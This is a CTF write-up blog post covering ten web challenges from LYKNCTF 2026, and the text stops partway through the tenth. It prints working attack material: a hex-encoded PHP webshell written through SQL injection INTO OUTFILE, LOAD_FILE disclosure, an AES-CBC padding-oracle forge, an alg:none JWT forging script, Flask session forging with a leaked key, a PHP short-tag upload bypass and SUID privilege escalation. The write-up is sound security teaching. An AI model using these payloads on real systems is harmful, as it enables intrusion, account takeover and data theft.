---
title: "LYKNCTF 2026 Web Writeup: 10 Challenges Solved (Padding Oracle, JWT alg:none, SSRF+SSTI, PHP .php5, SQLi RCE)"
slug: "lyknctf-2026-web-writeup"
description: "Step-by-step LYKNCTF 2026 web-track writeup — ten challenges covering HTTP 302 body leaks, WebSocket race, nginx case-sensitivity bypass, AES-CBC padding oracle (CBC-R), 4-digit OTP brute + SQLi RCE + SUID csvtool, client-side API key leak, Flask debug source disclosure, JWT alg:none forge, PHP short-tag .php5 RCE, and SSRF into HMAC-invite forge into Jinja2 SSTI."
date: 2026-07-09T14:15:00Z
lastmod: 2026-07-09T14:15:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
series: ["LYKNCTF 2026"]
tags:
  - "lyknctf"
  - "lyknctf 2026"
  - "ctf writeup"
  - "web track"
  - "padding oracle"
  - "cbc-r"
  - "jwt alg:none"
  - "flask session forge"
  - "ssrf"
  - "jinja2 ssti"
  - "php short tag"
  - "nginx case sensitivity"
  - "websocket race"
  - "sqli rce"
  - "suid binary"
  - "http 302 body"
keywords:
  - "lyknctf 2026 web writeup"
  - "lyknctf web writeup"
  - "right in front of your eyes writeup"
  - "spawn race writeup websocket"
  - "lykn mail nginx case sensitive bypass"
  - "legacy profile importer padding oracle cbc-r"
  - "fu career sqli rce writeup"
  - "gold hunters window.api_key writeup"
  - "freebie flask debug secret writeup"
  - "discord nitro jwt alg none writeup"
  - "ocr php short tag php5 writeup"
  - "vendor review portal ssrf hmac ssti writeup"
  - "ctf padding oracle attack step by step"
  - "flask session forge itsdangerous"
  - "jinja2 ssti __globals__ __builtins__"
toc: true
cover:
  image: "/images/articles/lyknctf-2026-web-writeup.png"
  alt: "LYKNCTF 2026 web writeup — ten web challenges solved covering padding oracle, JWT alg:none, SSRF+SSTI, PHP short-tag RCE, and Flask debug source disclosure"
---

LYKNCTF 2026's web track shipped ten challenges that collectively covered almost every category of modern web vulnerability: an HTTP-protocol trick that abuses the RFC-9110 allowance for bodies on 3xx redirects, a WebSocket race condition that only trips on pipelined frames, an nginx case-sensitivity `location` bypass into an autoindexed directory, a full AES-CBC padding oracle (CBC-R) against a signed session token with three distinguishable error classes, a four-digit OTP brute-force feeding a SQL-injection-to-RCE that reads a split flag via a SUID `csvtool` binary, a client-side leak of `window.API_KEY` combined with an OpenAPI-schema-discovered admin endpoint, a Flask `?debug=1` source-disclosure hook that leaks `app.secret_key` for a session forge, a textbook `alg:none` JWT bypass, a PHP short-tag `.php5` extension bypass through a Tesseract OCR pipeline, and a five-stage SSRF-into-internal-source-map-into-HMAC-invite-forge-into-Jinja2-SSTI chain.

This is the master writeup for the entire web track. Original handouts, per-challenge READMEs, and full solver scripts live at [Abdelkad3r/LYKNCTF](https://github.com/Abdelkad3r/LYKNCTF). Every challenge is walked step-by-step, with the exploit reasoning, artefacts recovered, and one-shot commands preserved so the whole chain can be replayed on a fresh instance.

## The ten LYKNCTF 2026 web challenges

| # | Challenge | Bug class | Flag |
|---|---|---|---|
| 1 | Right in front of your eyes | HTTP 302 body carries the flag; browsers drop 3xx bodies, `curl` without `-L` prints them. | `LYKNCTF{ff32f12568be4a43a62abdbb80d85b2a}` |
| 2 | Spawn Race | WebSocket race: six pipelined `spawn` frames trip a "race won" reply the button UI can never trigger. | `LYKNCTF{68a970311d3541ada7f9e5cd9d49dd5f}` |
| 3 | LYKN Mail | `robots.txt` names `/backup`, nginx blocks lower-case only; `/Backup/` is autoindexed. Shared default password `Welcome123!` reaches another user's mailbox, which contains cleartext admin creds. | Per-instance (e.g. `LYKNCTF{558a8a1c99e64f23965a0e6c46157727}`) |
| 4 | Legacy Profile Importer | AES-CBC token with three distinguishable error classes (bad padding, bad JSON, success). Full CBC-R against `{"role":"admin"}` + `\x10` × 16. | Per-instance (e.g. `LYKNCTF{45b32deb923d4480b0b3f2d6606a5e65}`) |
| 5 | FU Career | Username enum → 4-digit OTP brute → HR admin dashboard → `preview.php` SQLi → `LOAD_FILE`/`INTO OUTFILE` → webshell → SUID `csvtool` reads root-only `/part2.txt`. Split flag reassembled from `admin.php` + `csvtool col 1 /part2.txt`. | `LYKN{default_credential_sqli2rce_r0n4d0_m3ss1}` |
| 6 | Gold hunters | `window.API_KEY` leaked in root HTML. `/api/openapi.json` documents hidden `GET /api/get-flag`. | `LYKNCTF{e6efbe9ffd724a6eafe7405ddd533e56}` |
| 7 | Freebie | Global `@app.before_request` hook returns `open(__file__).read()` when `?debug=1` present. Leaks `app.secret_key`, forge Flask session with `{"username":"admin"}`. | `LYKNCTF{4116165b42ed40e5a3fc1af9b495961e}` |
| 8 | Discord Nitro | JWT verifier accepts `alg:none`. Forge `{"user":"admin","role":"admin"}` with empty signature (trailing dot required). | `LYKNCTF{8ca07868c81c46549512df28e26bde1d}` |
| 9 | OCR | Tesseract pipeline saves recognised text under user-controlled filename. Extension blacklist blocks `.php`/`.phtml`/`.phar` but not `.php5`. Content blacklist blocks `<?php`/`<?=` but PHP short tags are enabled: `<? include "/flag"; ?>`. | `LYKNCTF{8487626135e4497f9d4ff9163be2d87a}` |
| 10 | Vendor Review Portal | Hidden `/mirror` fetches user URL server-side (SSRF). Reaches `cache-proxy:5000` → leaks HMAC seed + source map documenting invite construction. Forge admin invite for own email → admin billing preview is Flask/Jinja2 SSTI. | `LYKNCTF{ae62bd024ee543c5b7e079a02c48542b}` |

The pattern that connects most of the challenges: the flag lives on a code path the browser or the built-in UI can never reach. Right in front of your eyes puts the flag in a 302 body no browser renders. Spawn Race puts the flag in a WebSocket reply that only fires on a burst rate no button can achieve. Gold hunters puts the endpoint in an OpenAPI schema the frontend never links. Discord Nitro puts the trust decision behind a JWT header the frontend never edits. Vendor Review Portal puts every stage of the chain behind a route or service DNS name the public UI never mentions. The skill the web track rewards is treating the browser as one client among many, and inspecting the raw HTTP, WebSocket frames, JSON schemas, and source maps that ship alongside it.

## Methodology — raw HTTP first, always

A pattern that worked across every challenge: the first move on a new target was `curl -i` against the root URL, before opening a browser. Right in front of your eyes is literally solved by that one command; Gold hunters is solved by `curl -s / | grep API_KEY`; Freebie is solved by `curl /login?debug=1 | head`; Discord Nitro is solved by decoding the base64 in the `Set-Cookie` header. Any challenge where the flag is deliberately not rendered in the DOM will surface faster on the wire than in devtools.

The second move was inspecting the JavaScript bundles for endpoint names, feature flags, and secret material. Spawn Race's `spawnId` field is exposed in every WebSocket reply; the `alg:none` forge in Discord Nitro follows from decoding the token in the bundle-visible `token` cookie; Gold hunters' `window.API_KEY` is on line 5 of the root HTML; the OpenAPI schema at `/api/openapi.json` is a documented convention that every modern framework ships. Reading the client is not "extra work"; it is where the vocabulary of the challenge is spelled out.

The third move, whenever an admin/authenticated area exists, was to enumerate the token or session shape. Flask sessions decode with `itsdangerous` if the key is known (or leaked, as in Freebie); JWTs decode with base64 alone; Vendor Review Portal's HMAC-signed invite tokens follow a documented construction visible in an internal source map. Every "become admin" challenge in the track ultimately reduced to reproducing the server's own signing procedure with attacker-supplied claims.

Per-challenge walkthroughs follow, in the numbered order they appear in the repo's index.

## 1. Right in front of your eyes

An HTTP protocol trick. The root URL returns a 302 with the flag in the response body; browsers follow the redirect and drop the body without rendering it.

#### Step 1 — Browser rendering hides the flag

Opening the URL in a browser shows a plain page:

> **It in front of your eyes**
> But you can't see it

The address bar reads `/`. Devtools shows the request path as `/`, and the returned document includes:

```html
<script>
  // You find 1 more clue hmmm.
  history.replaceState(null, "", "/");
  document.currentScript.remove();
</script>
```

Someone deliberately rewrote the URL bar back to `/` and deleted the script afterwards. The real path the browser landed on was hidden from view.

#### Step 2 — Raw HTTP without follow-redirects

```bash
$ curl -s -i "http://<host>/"
HTTP/1.1 302 Found
Content-Length: 116
Content-Type: text/plain; charset=utf-8
Location: /A
Server: Python/3.12 aiohttp/3.14.1

Well done! You never expect this page to be here, right?
Here is the flag: LYKNCTF{ff32f12568be4a43a62abdbb80d85b2a}
```

The root returns 302 and the response body carries the flag in plain text. RFC 9110 §15.4 allows 3xx responses to include a body ("SHOULD contain a short hypertext note with a hyperlink to the different URI(s)"), but browsers treat every 3xx as a control message: they read `Location:`, drop the body, and issue the follow-up request. The payload is never rendered, never shown in the network-tab preview, and never reachable from the destination page.

#### Step 3 — Confirm the redirect target is a decoy

Repeating the request returns different `Location:` values:

```
/u   /i   /r   /B   /v
```

Randomised on every request. Each of those endpoints renders the same empty "Home Page" template. Anyone who assumes the destination path is meaningful and starts fuzzing burns time on a red herring. The randomisation is deliberate: it guarantees the redirect target cannot be the answer.

Per-challenge README: [web/right-in-front-of-your-eyes](https://github.com/Abdelkad3r/LYKNCTF/tree/main/web/right-in-front-of-your-eyes).

## 2. Spawn Race

A single-button WebSocket toy where the flag only appears in the sixth reply of a fast burst. Human clicking can't achieve the required cadence; a scripted client sending six pipelined frames can.

#### Step 1 — Decode the client

The landing page opens a WebSocket to the same host and wires `spawnButton.click` to send `{"type":"spawn"}`. The message handler:

```js
socket.addEventListener('message', (event) => {
  const message = JSON.parse(event.data);
  if (message.type === 'spawned' && message.image && message.sound) {
    showSpawn(message.image, message.sound);
  }
});
```

Only `type`, `image`, and `sound` are read. Anything else is silently discarded and never appears in the DOM. And there's no client-side throttling. That's already two hints that the interesting behaviour is server-side and can only be seen from a scripted client.

#### Step 2 — Baseline probe

```json
send: {"type":"spawn"}
recv: {"type":"spawned","image":"/images/1.gif","sound":"/sounds/1.mp3","spawnId":1}
```

The `spawnId` field is not used by the client but is present. The server tracks a per-connection counter and exposes it in every reply.

#### Step 3 — Slow send returns nothing

Ten spawns spaced 600 ms apart (roughly the top of comfortable button-mashing at 1.7 Hz) return the same shape every time. No `flag`, no `race`, no extra fields.

#### Step 4 — Pipeline the sends and burst

Change the loop so all messages go out before any replies are read:

```python
for _ in range(N):
    await ws.send(json.dumps({"type": "spawn"}))
for _ in range(N):
    replies.append(await ws.recv())
```

Sweeping N:

| Burst size | Winners | First winning `spawnId` |
|---|---|---|
| 1-5 | 0 | — |
| **6** | **1** | **6** |
| 7-20 | 1 | 6 |

The sixth reply in a fast burst always contains the flag:

```json
{"type":"spawned","image":"/images/1.gif","sound":"/sounds/8.mp3",
 "spawnId":6,"race":"won","flag":"LYKNCTF{68a970311d3541ada7f9e5cd9d49dd5f}"}
```

If the six frames arrive too slowly (even a `send → recv → sleep(0)` loop with per-message round-trip latency is too slow), the counter or timer resets and the flag is never emitted.

The button-driven UI forces a request/response cadence: click, animation, click, animation. Between clicks the browser drains microtasks, updates the DOM, calls `audio.play().catch(() => {})`, and only then sends the next frame. The server's window is tighter than that. The only way to "win the race" is to skip the button entirely and drive the WebSocket directly.

Per-challenge README + Python solver: [web/spawn-race](https://github.com/Abdelkad3r/LYKNCTF/tree/main/web/spawn-race).

## 3. LYKN Mail

Four small mistakes chained together give admin: `robots.txt` names `/backup`, nginx blocks lowercase only, shared default password reaches a second employee, and that employee's mailbox contains cleartext admin credentials.

#### Step 1 — Read robots.txt

```
$ curl -s $URL/robots.txt
User-agent: *
Disallow: /backup
```

A single `Disallow` is the classic CTF finger-in-the-air. `/backup` returns 403 (nginx's default HTML, not Flask's), so the block sits above the application.

#### Step 2 — Bypass nginx case-sensitivity

nginx `location` matching is case-sensitive by default. If the block is written as `location /backup { ... }`, any path that differs only in case sails past it:

| Path | Status |
|---|---|
| `/backup` | 403 (blocked) |
| `/Backup` | 301 → `/Backup/` |
| `/Backup/` | 200 (nginx autoindex) |

The autoindex reveals `credentials.txt`, which contains:

```
New Employee Credentials
========================
Username: tuan.nguyen
Password: Welcome123!
```

#### Step 3 — First login is a dead-end account

`tuan.nguyen:Welcome123!` logs in as a low-privilege employee. Their session decodes to `role: "employee"`, `/admin` returns 403, and `flask-unsign` against the default wordlist (~56k keys) does not recover the signing secret. Forging `role: "admin"` is off the table; something else has to give admin.

#### Step 4 — Reuse the default password against a second account

Tuan's inbox contains an onboarding email from `minh.le@lykn.local`. The file was labelled "New Employee Credentials"; that password is reused by design:

```
$ curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" \
       -X POST -d "username=minh.le&password=Welcome123!" $URL/login
302 .../dashboard
```

It works. Minh Le is still `role: "employee"`, but their inbox has two emails.

#### Step 5 — Admin credentials in a mailbox

Minh's second email is from `admin@lykn.local`:

> Also, you asked about the monitoring dashboard earlier. Here's the service account you can use to check logs while I'm on leave next week:
>
> Username: admin
> Password: Adm1n_S3cur3_P@ss_2026

An admin sharing their password over internal mail is the textbook version of "messaging is not access control." Log in as admin, load `/admin`, read the flag block from the rendered HTML.

Per-challenge README + solve script: [web/lykn-mail](https://github.com/Abdelkad3r/LYKNCTF/tree/main/web/lykn-mail).

## 4. Legacy Profile Importer

A classic AES-CBC padding oracle. The landing page hands out an encrypted "migration token"; the server decrypts, strips PKCS7 padding, JSON-parses, and returns the profile. Three distinct error classes make padding vs content failures separable; the whole primitive follows.

#### Step 1 — Map the oracle

Probing `/api/migrate` with random tokens gives three cleanly distinct errors:

- `500: Token corrupted, invalid padding` (PKCS7 rejected)
- `400: profile data is unreadable` (PKCS7 fine, JSON parse failed)
- `200: Migration successful` (both fine, profile returned)

The 500 fires only when the PKCS7 pad byte after decryption is illegal. That is the primitive: a per-request boolean of "was the padding valid?", enough for standard byte-by-byte recovery of `D(C)` for any ciphertext block `C` without knowing the key.

#### Step 2 — First attempts that don't work

**Bit-flip the IV.** Block 0's plaintext is probably `{"role":"user","` (16 chars); flip the IV bits to turn it into `{"role":"admin"}`. The rest of the plaintext then reads `user":"guest","v":"1.0"}` after the `}`, which is not valid JSON. `400: Token decrypted, but profile data is unreadable`.

**Truncate to two blocks.** A 32-byte token would decrypt to a single 16-byte plaintext block, but `{"role":"admin"}` ends with `}` (`0x7D`), which is not a valid PKCS7 pad byte. `500: invalid padding`.

We need a payload that reduces to a single clean JSON object after PKCS7 stripping. That means constructing both the content block and a proper 16-byte pad block from scratch. That is CBC-R.

#### Step 3 — CBC-R construction

Target plaintext (32 bytes = 2 blocks):

```
P0 = b'{"role":"admin"}'          # exactly 16 bytes
P1 = b'\x10' * 16                 # PKCS7 pad block for a 16-byte payload
```

Ciphertext layout: `Y0 || Y1 || Y2` where `Y0` is the IV.

```
Q0 = D(Y1) XOR Y0                 # want this = P0
Q1 = D(Y2) XOR Y1                 # want this = P1
```

Working right-to-left:

1. Pick any 16 bytes for `Y2`. Reuse the last original ciphertext block.
2. Padding-oracle-decrypt `Y2` to recover `I2 = D(Y2)`.
3. `Y1 = I2 XOR P1`, which guarantees `Q1 = P1 = \x10 * 16`.
4. Padding-oracle-decrypt `Y1` to recover `I1 = D(Y1)`.
5. `Y0 = I1 XOR P0`, which guarantees `Q0 = P0 = {"role":"admin"}`.

Send `Y0 || Y1 || Y2`, base64-encoded, as the `token` field. Server decrypts to `{"role":"admin"}` (perfect PKCS7), JSON parses cleanly, response returns the flag.

Total requests: two full byte-by-byte block recoveries. Worst case `2 × 256 × 16 = 8192`, average around 4000. At 12 concurrent probes the whole attack lands in 4-7 minutes per instance.

#### Step 4 — Verify position 15 to avoid natural-pad collisions

When recovering the last byte of an intermediate `D(C)`, the oracle sometimes returns a valid-padding hit that corresponds not to `\x01` at the end but to a longer natural pad (e.g. `...\x02\x02` if the guessed byte happens to make the second-to-last plaintext byte equal `\x02`). Disambiguation: flip `IV[14]`. A real `\x01` pad is unaffected; an accidental `\x02` collision becomes invalid. The solver handles this explicitly.

#### Step 5 — Fire

```
$ python3 solve.py http://<instance-uuid>...
[*] fetched starter token: R2KtPljxS7Dcb9DYxL/SM...RJA==
[*] padding-oracle decrypt Y2 (pad block)...
[*] Y2 done in 106.0s
[*] padding-oracle decrypt Y1 (content block)...
[*] Y1 done in 127.9s
[*] forged token: aP22bFVtleaDHu0sQ1/uvxCtBKfhCIlIcgVMOh8FJlnDfylk68Oz3/IZ+bItmREk
HTTP 200 {"flag":"LYKNCTF{45b32deb923d4480b0b3f2d6606a5e65}", ...}
```

Per-challenge README + full CBC-R solver: [web/legacy-profile-importer](https://github.com/Abdelkad3r/LYKNCTF/tree/main/web/legacy-profile-importer).

A useful side-discovery from recovering `Y2`: decrypting the original last ciphertext block reveals the plaintext of block 3 as `"v":"1.0"}` followed by six bytes of `\x06`. The assigned token is 42 characters, not 40, and PKCS7 pad is 6 bytes. A bit-flip-only attack that hardcodes the assumed plaintext will XOR against the wrong bytes and never produce a valid pad. General CBC-R with the padding oracle sidesteps this: it doesn't need to know the plaintext at all.

## 5. FU Career

The longest chain of the track. Username enumeration → 4-digit OTP brute → HR admin → SQL injection with `LOAD_FILE`/`INTO OUTFILE` → webshell → SUID `csvtool` reads the root-only half of a split flag.

#### Step 1 — Enumerate the HR username

The footer contains HR contact addresses. The important one:

```
hr.fehn@fe.edu.vn
```

The password-reset page distinguishes valid from invalid usernames:

```
POST /forgot.php username=hr.fehn
→ 302 Location: reset.php?username=hr.fehn
```

Invalid usernames return a different message. Confirmed enumeration primitive.

#### Step 2 — Brute-force the 4-digit OTP

The reset form asks for a 4-digit code and a new password:

```html
<input name="otp" inputmode="numeric" maxlength="4">
<input name="password" type="password">
```

No meaningful lockout. Full search 0000–9999 is small enough to hit directly. On the solve instance, the valid OTP was `6953`. Log in as `hr.fehn` with the new password; `dashboard.php` redirects admins straight to `admin.php`.

#### Step 3 — Read the admin dashboard clues

Two important things on `admin.php`:

The first half of the real flag is printed inline:

```html
<h2>part1: LYKN{default_cred</h2>
```

And there's a "Quick Preview" form:

```html
<form method="post" action="preview.php">
  <input name="cv_id" value="1">
</form>
```

#### Step 4 — SQL injection in preview.php

`LOAD_FILE()` through a UNION SELECT dumps the source:

```php
require_once 'config.php';
require_admin();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cv_id = $_POST['cv_id'] ?? '';
    $query = "SELECT * FROM cv_submissions WHERE id = $cv_id";
    $result = @mysqli_query($conn, $query);
}
```

Raw concatenation. The table has nine selected columns, so a source-disclosure payload:

```sql
-1 UNION SELECT
  1, 2,
  LOAD_FILE('/var/www/html/preview.php'),
  'SRC', 'src.txt', 'seed_cv.txt', 'COVER', 'pending', 'NOW'
```

Put the file contents in `candidate_name` (rendered in the page heading), and keep `stored_filename` set to the known-valid `seed_cv.txt` so the preview page doesn't take its "file missing" branch.

The MySQL grants explain why it works:

```sql
GRANT ALL PRIVILEGES ON fucareer.* TO 'ctf'@'localhost';
GRANT FILE ON *.* TO 'ctf'@'localhost';
```

`FILE` is enough for both `LOAD_FILE()` and `INTO OUTFILE`.

#### Step 5 — Recognise the environment decoy

Once the webshell is up, `env` shows:

```
FLAG=LYKNCTF{e3a8e2d20fad487b89564ec974f6d9d9}
```

Looks convincing; is not accepted by the checker. This is the deliberate decoy. The real flag is split between `admin.php`'s `part1` and a root-only file `/part2.txt`.

#### Step 6 — SQLi to webshell via INTO OUTFILE

Encode a small PHP file as a hex blob so it survives the raw SQL query, then `INTO OUTFILE`:

```sql
-1 UNION SELECT
  1, 2,
  0x3c3f706870206563686f202253544152545c6e223b2073797374656d28245f4745545b2263225d203f3f2022696422293b206563686f20225c6e454e445c6e223b203f3e,
  'P', 'F', 'seed_cv.txt', 'C', 'pending', 'N'
INTO OUTFILE '/var/www/html/uploads/fu_<timestamp>.php'
```

Decoded, the payload is:

```php
<?php echo "START\n"; system($_GET["c"] ?? "id"); echo "\nEND\n"; ?>
```

The shell runs as `www-data`. `/part2.txt` is visible with `stat` but mode `0400`, owned by root, so unreadable.

#### Step 7 — SUID csvtool reads the root-only file

```
$ find / -perm -4000 -type f -ls 2>/dev/null
-rwsr-xr-x 1 root root 1933888 Jun 14 2025 /usr/bin/csvtool
```

`csvtool` is a CSV manipulation utility. With the SUID bit, it opens input files as root. `/part2.txt` contains a single CSV-compatible field:

```
$ /usr/bin/csvtool col 1 /part2.txt
ential_sqli2rce_r0n4d0_m3ss1}
```

That's the missing suffix. Reassemble:

```
LYKN{default_cred + ential_sqli2rce_r0n4d0_m3ss1}
= LYKN{default_credential_sqli2rce_r0n4d0_m3ss1}
```

Per-challenge README + full exploit: [web/fu-career](https://github.com/Abdelkad3r/LYKNCTF/tree/main/web/fu-career).

The environment `FLAG` variable is a deliberate decoy, a useful demonstration that "web app RCE with a matching-format flag string in `env`" is not automatically the answer. The real flag was split and protected specifically to require the SUID escalation. The lesson generalises: any "found a flag-shaped string" moment during a chain needs a second confirmation before it becomes a submitted flag.

## 6. Gold hunters

The API key is in `window.API_KEY` on line 5 of the root HTML. The OpenAPI schema documents a hidden `GET /api/get-flag`. The whole exploit is two `curl` requests.

#### Step 1 — Read the raw root

The browser renders a small contact form. The raw HTML is much more informative:

```html
<script>
  window.API_KEY = "O3lccixN7yl3ySB7iGjEK5fIzXkicCvTegMf5WcUGTU";
</script>
<script type="module" crossorigin src="/assets/index-...js"></script>
```

The API key is embedded in the document before the app even loads. The JavaScript bundle only uses it for `POST /api/contact`, so from the frontend's perspective it isn't really needed. It's an exposed backend credential regardless.

#### Step 2 — Confirm the key gates real endpoints

```
$ curl -i $URL/api/get-flag
HTTP/1.1 401 Unauthorized
{"detail":"Invalid or missing API key"}

$ curl -i -H 'X-API-Key: O3lccixN7yl3ySB7iGjEK5fIzXkicCvTegMf5WcUGTU' \
       $URL/api/contact
HTTP/1.1 200 OK
[]
```

The leaked value is real, not decorative.

#### Step 3 — Read the OpenAPI schema

Modern FastAPI/Swagger apps ship a machine-readable API schema at `/api/openapi.json`. It documents every route, including the ones the frontend never calls:

```json
{
  "/api/contact": { "post": {...}, "get": {...} },
  "/api/get-flag": {
    "get": {
      "summary": "Get Flag",
      "description": "Well done! You found the hidden flag endpoint.",
      "parameters": [{ "name": "x-api-key", "in": "header" }]
    }
  }
}
```

#### Step 4 — Fire

```
$ curl -i -H 'X-API-Key: O3lccixN7yl3ySB7iGjEK5fIzXkicCvTegMf5WcUGTU' \
       $URL/api/get-flag
HTTP/1.1 200 OK
{"flag":"LYKNCTF{e6efbe9ffd724a6eafe7405ddd533e56}"}
```

Per-challenge README + exploit: [web/gold-hunters](https://github.com/Abdelkad3r/LYKNCTF/tree/main/web/gold-hunters).

Client-side JavaScript can hold public configuration, not secrets. Any value placed in HTML or bundled assets should be treated as already disclosed. And OpenAPI schemas are documentation for everyone, including attackers: if a route should not be reached, gate it with real auth, not "not linked from the frontend."

## 7. Freebie

A global `@app.before_request` hook returns `open(__file__).read()` when `?debug=1` is present. That leaks `app.secret_key`, which lets you forge a Flask session with `{"username":"admin"}`.

#### Step 1 — Confirm session-based authentication

A normal registration + login sets:

```
Set-Cookie: session=eyJ1c2VybmFtZSI6InEifQ.akxFxQ.NmK_2JsA_lVODK1iT0mO1fp730k; HttpOnly; Path=/
```

Base64-decoding the first part: `{"username":"q"}`. The application stores the username in the client-side Flask session; the trust decision is the session's HMAC signature.

`/register` and `/login` both explicitly refuse the literal string `admin`:

```
Error: Registration for the 'admin' account is prohibited.
Error 403: Admin login via web interface is disabled.
```

So the intended trap is "no admin credentials, no admin session." But the trust is only in the signature, not in the username field itself.

#### Step 2 — Find the debug hook

Testing query parameters against the login route:

```
$ curl -i "$URL/login?debug=1"
HTTP/1.1 200 OK
<body style='background:#1e1e1e; color:#d4d4d4;'><pre>from flask import Flask, request, session, redirect, url_for, render_template
import os

app = Flask(__name__)
app.secret_key = "sup3r_s3cr3t_ctf_k3y_727"
users_db = {}
...
```

Because the hook is `@app.before_request`, `?debug=1` works on *any* route:

```python
@app.before_request
def before_request():
    if "debug" in request.args:
        with open(__file__, "r") as f:
            source_code = f.read()
        return f"<body ...><pre>{source_code}</pre></body>"
```

#### Step 3 — Forge the admin session

With `app.secret_key`, Flask's client-side session cookie is forgeable:

```
$ flask-unsign --sign \
    --cookie "{'username':'admin'}" \
    --secret 'sup3r_s3cr3t_ctf_k3y_727'
eyJ1c2VybmFtZSI6ImFkbWluIn0.ak2JGQ.gxgHhF9lexQJArEFj1RE8_-Spm0
```

`/flag` only inspects `session.get('username')`, so:

```
$ curl -H "Cookie: session=<forged>" $URL/flag | grep -oE 'LYKNCTF\{[^}]+\}'
LYKNCTF{4116165b42ed40e5a3fc1af9b495961e}
```

Per-challenge README + exploit: [web/freebie](https://github.com/Abdelkad3r/LYKNCTF/tree/main/web/freebie).

The important bug was not the login form; those checks did block direct admin use. The mistake was leaving a global debug source-disclosure hook reachable in production. Flask's signed session protects integrity only as long as `app.secret_key` remains secret. A debug helper that prints `__file__` turns that key into public data, and every client-side session becomes forgeable.

## 8. Discord Nitro

A textbook `alg:none` JWT bypass. The server accepts unsigned tokens; forge `{"user":"admin","role":"admin"}` with `alg:none` in the header and an empty signature (with the trailing dot).

#### Step 1 — Log in as guest and decode the token

The landing page advertises `guest`/`guest`. Log in:

```
Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.dCdGtxl1AM3Uk65cK67xMPkvOdoCmYZ2YAXd4-SykTs
```

Decoded:

| Segment | Decoded |
|---|---|
| Header | `{"alg":"HS256","typ":"JWT"}` |
| Payload | `{"user":"guest","role":"user"}` |
| Signature | 32 bytes of HMAC-SHA256 |

`/admin` returns 403 for `role:"user"`. The whole game is turning `role:"user"` into `role:"admin"`.

#### Step 2 — Try alg:none first

Two natural attacks:

1. **alg:none** is the RFC-7519 "unsecured JWS" option. If the server's decoder trusts the `alg` field to pick the verification routine, `alg:none` skips the signature check. One request; try it first.
2. **Weak HS256 secret** via hashcat or `jwt_tool` with a wordlist. Only worth doing if `none` is blocked.

Three-line forge:

```python
import base64, json
def b64(x): return base64.urlsafe_b64encode(x).rstrip(b'=').decode()
hdr = b64(json.dumps({"alg":"none","typ":"JWT"}, separators=(',',':')).encode())
pay = b64(json.dumps({"user":"admin","role":"admin"}, separators=(',',':')).encode())
token = f"{hdr}.{pay}."
```

Two implementation notes:

- **The trailing dot is deliberate.** A JWT is three segments joined by dots. Dropping the third segment entirely (`hdr.payload`) breaks the shape and some decoders reject it before ever looking at `alg`. Leave the third segment empty (`hdr.payload.`).
- **`separators=(',',':')` matters.** JSON with default separators has extra whitespace (`, ` and `: `). If the server canonicalises the header before hashing, extra bytes change the digest.

#### Step 3 — Read the flag

```
$ curl -H "Cookie: token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ." \
       $URL/admin | grep -oE 'LYKNCTF\{[^}]+\}'
LYKNCTF{8ca07868c81c46549512df28e26bde1d}
```

Per-challenge README + exploit: [web/discord-nitro](https://github.com/Abdelkad3r/LYKNCTF/tree/main/web/discord-nitro).

`alg:none` in 2026 is still worth trying first on any JWT-verifying endpoint. Modern JWT libraries default it off, but hand-rolled decoders (of which "CTF web challenge" is basically the archetype) very often route through the header algorithm without a strict allow-list. It costs one request. The `guest`/`guest` credential in the demo hint is not just flavour; it exists so you see the token shape.

## 9. OCR

A Tesseract pipeline that stores recognised text under a user-controlled filename. The extension blacklist blocks `.php`/`.phtml`/`.phar` but not `.php5`, and the content blacklist blocks `<?php`/`<?=` but PHP short tags are still enabled.

#### Step 1 — Understand the pipeline

The app POSTs a PNG data URL to `/`, Tesseract OCRs it, and the app returns a review form:

```html
<pre>HELLO NOTE</pre>
<form class="save-form" method="post">
  <input type="hidden" name="save_output" value="1">
  <input type="hidden" name="ocr_id" value="8f5bd99618e82a41b0f467aac97f085d">
  <input id="filename" name="filename" value="note.txt" maxlength="80">
</form>
```

Submit the save; the recognised text lands at `/saved/<filename>`, directly web-readable.

#### Step 2 — Sweep the extension blacklist

```
good.txt      → saved
good.md       → saved
good.log      → saved
shell.php     → Executable note extensions are not allowed.
shell.phtml   → blocked
shell.phar    → blocked
shell.PHP     → blocked
shell.php5    → Saved as: saved/shell.php5
```

`.php5` is a legacy PHP extension the extension blacklist missed. Requesting `/saved/shell.php5` shows `X-Powered-By: PHP/8.2.32`. Extension bypass confirmed.

#### Step 3 — Sweep the content blacklist

Straight PHP payloads are rejected:

```
<?php echo 123; ?>        → The recognized text looks unsafe and was not saved.
<?= 123 ?>                → blocked
```

Probing smaller tokens showed the filter is token-based, not character-based:

```
php       → saved
system    → blocked
eval      → blocked
```

Legacy PHP short-open-tag syntax avoids `<?php` and `<?=` entirely:

```php
<? echo 123; ?>
```

Saved as `.php5`, this executed. `123` came back on the wire.

#### Step 4 — Read the flag with include

No need for `system` or `eval`. PHP's `include` reads and prints a plain file. OCR the payload:

```php
<? include "/flag"; ?>
```

Save as `.php5`, request the saved URL:

```
LYKNCTF{8487626135e4497f9d4ff9163be2d87a}
```

Per-challenge README + Python exploit + ImageMagick payload PNG: [web/ocr](https://github.com/Abdelkad3r/LYKNCTF/tree/main/web/ocr).

Two partial defences that failed together. The extension blacklist blocked the common PHP extensions but the server still executed `.php5`. The token blacklist blocked `<?php`, `<?=`, `system`, and `eval`, but short-open-tag PHP was still enabled and `include` was enough to read the flag. For any real note-saving application, user-controlled files should never be written inside an executable web root; if they must be web-accessible, serve them from non-executable storage with strict content-type handling.

## 10. Vendor Review Portal

The longest and most rewarding chain of the track. Five stages: SSRF via `/mirror` → internal `cache-proxy:5000` service leaks HMAC seed and source-map path → source map documents the invite construction → forge an admin invite for your own email → admin billing preview is Flask/Jinja2 SSTI → read `/flag.txt`.

#### Step 1 — Register and find /mirror

Register a normal account, land on `/dashboard`. The dashboard has two useful hints:

```html
<p class="muted">
  Cached previews are stored as text responses for review.
  Remote warm-up jobs are delegated to a separate renderer worker.
</p>
```

Route discovery finds `/mirror` (not linked in the user navigation):

```html
<form action="/mirror" method="post">
  <input id="name" name="name" type="text" required>
  <input id="logo_url" name="logo_url" type="url" required>
</form>
```

